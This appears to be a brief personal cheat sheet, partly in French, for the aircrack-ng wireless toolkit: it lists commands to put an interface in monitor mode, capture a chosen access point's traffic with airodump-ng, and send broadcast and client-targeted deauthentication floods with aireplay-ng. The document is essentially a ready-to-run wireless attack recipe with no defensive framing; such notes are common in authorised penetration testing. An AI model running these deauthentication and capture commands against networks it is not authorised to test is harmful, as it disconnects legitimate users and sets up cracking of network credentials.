# aicrack-ng

Enabling monitor mode

Before capturing any traffic, it is necessary to enable the monitoring mode on the 802.11 interface wlan0.

This is typically done using iwconfig

```sh
$ iface = wlan0
$ sudo ifconfig $iface down
$ sudo iwconfig $iface mode monitor
$ sudo ifconfig $iface up
```

Where wlan0 is the name of your wireless interface supporting the monitor mode. From this point,
the interface wlan0 is in monitor mode and ready to capture and inject traffic.
If you are encountering errors or a strange behavior with your monitoring interface, you can try
"unblocking" the interface with the following commands:

```sh
$ nmcli nm wifi off
$ sudo rfkill unblock all
```

## capture dans un fichier :

```sh
$ airodump-ng --essid <nom AP> -c <channel> -w capture-file wlan1
$ airodump-ng --bssid <mac AP> -c <channel> -w capture-file wlan1
```

## deauth (broadcast):

```sh
sudo aireplay-ng --deauth 30 -a <mac AP> wlan1
```

## deauth ciblé:

```sh
sudo aireplay-ng --deauth 30 -a <mac AP> -c <mac Client> wlan1
```